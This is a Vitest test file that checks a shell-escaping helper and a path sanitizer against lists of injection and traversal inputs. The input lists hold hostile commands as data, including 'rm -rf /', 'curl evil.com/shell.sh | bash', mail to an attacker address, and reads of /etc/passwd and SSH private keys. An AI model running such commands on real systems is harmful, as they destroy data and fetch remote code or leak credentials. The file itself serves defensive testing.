import { describe, it, expect } from 'vitest';
import { shellEscape, sanitizePath } from '../shell.js';

describe('Shell Injection Prevention', () => {
    const injectionVectors = [
        { name: 'semicolon command chain', input: '; rm -rf /' },
        { name: 'backtick substitution', input: '`whoami`' },
        { name: 'dollar-paren substitution', input: '$(cat /etc/passwd)' },
        { name: 'pipe to command', input: '| mail attacker@evil.com' },
        { name: 'redirect to file', input: '> /etc/crontab' },
        { name: 'append to file', input: '>> ~/.bashrc' },
        { name: 'and-chain', input: '&& curl evil.com/shell.sh | bash' },
        { name: 'or-chain', input: '|| curl evil.com/shell.sh | bash' },
        { name: 'newline injection', input: 'safe\nrm -rf /' },
        { name: 'null byte injection', input: 'safe\0; rm -rf /' },
        { name: 'double-quote breakout', input: '"; rm -rf /' },
        { name: 'single-quote breakout attempt', input: "'; rm -rf /'" },
        { name: 'glob expansion', input: '/*' },
        { name: 'home dir expansion', input: '~root/.ssh/id_rsa' },
        { name: 'variable expansion', input: '${PATH}' },
        { name: 'ANSI-C quoting', input: "$'\\x41'" },
    ];

    for (const { name, input } of injectionVectors) {
        it(`neutralizes ${name}`, () => {
            const escaped = shellEscape(input);
            // All escaped values should be wrapped in single quotes
            expect(escaped.startsWith("'")).toBe(true);
            expect(escaped.endsWith("'")).toBe(true);
            // No unescaped single quotes inside (except the proper escape sequence)
            // The content between outer quotes should not break out
            const inner = escaped.slice(1, -1);
            // Any embedded single quote should be properly escaped as '\''
            const singleQuoteSegments = inner.split("'\\''");
            // Each segment should not contain bare single quotes
            for (const segment of singleQuoteSegments) {
                expect(segment).not.toContain("'");
            }
        });
    }
});

describe('Path Traversal Prevention', () => {
    const traversalVectors = [
        '../../../etc/passwd',
        '/etc/passwd',
        '/root/.ssh/id_rsa',
    ];

    for (const input of traversalVectors) {
        it(`blocks traversal: ${input}`, () => {
            expect(() => sanitizePath(input, '/home/user/project')).toThrow();
        });
    }

    it('allows safe nested paths', () => {
        expect(() => sanitizePath('src/utils/file.ts', '/home/user/project')).not.toThrow();
    });

    it('allows current directory reference', () => {
        expect(() => sanitizePath('./src/file.ts', '/home/user/project')).not.toThrow();
    });
});
